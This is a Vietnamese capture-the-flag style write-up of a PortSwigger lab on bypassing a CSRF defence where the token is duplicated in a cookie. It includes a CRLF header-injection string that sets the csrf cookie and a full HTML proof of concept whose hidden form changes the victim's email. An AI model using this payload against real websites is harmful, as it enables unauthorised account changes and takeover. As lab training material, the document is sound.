# CSRF where token is duplicated in cookie

### Yêu cầu: Tạo thẻ HTML để tấn công CSRF thay đổi email của tài khoản người dùng

### Hướng làm: 

Đầu tiên, ta đăng nhập và tài khoản `wiener:peter` sau đó bắt request của bước thay đổi email.

![image](https://user-images.githubusercontent.com/72268643/158011350-ef24c9fc-6b79-4301-9454-575b10a9af0f.png)

Chúng ta thấy rằng cả cookie và token xác thực đều có giá trị là `csrf=NbTObOWB5JaRonW8qAEeKV3mOj4ugCm5`. Cookie và token sẽ được so sánh và đồng ý thực hiện hành động nếu giống nhau. Mình có thử thay đổi giá trị đó thành 1 giá trị bất kì và kết quả trả về thành công thay đổi email.

![image](https://user-images.githubusercontent.com/72268643/158011471-4a069abc-2bfc-4773-b2c5-189f948c1d6f.png)

Vậy nên nếu chúng ta có thể thêm/ghi đè cookie `csrf` sau đó gửi 1 request với giá trị token tương tự thì ta có thể bypass và thực hiện hành động đó.

Đầu tiên, ta sẽ thực hiện bước ghi đè thông qua bắt request thanh công cụ search:

![image](https://user-images.githubusercontent.com/72268643/158011657-2f8b3eb6-abe5-438f-a1c3-bcc67c4e25b3.png)

Sau đó ta thực hiện việc ghi đè cookie `csrf` bằng cách thêm `%0d%0aSet-Cookie:%20csrf=cuong` sau đường dẫn 

![image](https://user-images.githubusercontent.com/72268643/158011807-6efa87e2-84fa-40aa-aef7-69c9889ff023.png)

Set cookie thành công. Cuối cùng, chúng ta sẽ viết PoC để tấn tới nạn nhân theo mẫu sau:
```
<html>
  <body>
    <h1>Hello World</h1> <!-- Phần được hiển thị-->
    <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
    <form action="https://acda1fd11ec7ab69c04c0c1a007900ec.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="victimmmm&#64;gmail&#46;com">
      <input type="hidden" name="csrf" value="cuong" />
    </form>
    <img style="display:none;" src="https://acda1fd11ec7ab69c04c0c1a007900ec.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=cuong" onerror="document.forms[0].submit()">
  </body> <!-- Thẻ này để ghi đè cookie csrf-->
</html>
```
Sau đó gửi lên server và gửi đến cho nạn nhân và hoàn thành lab.
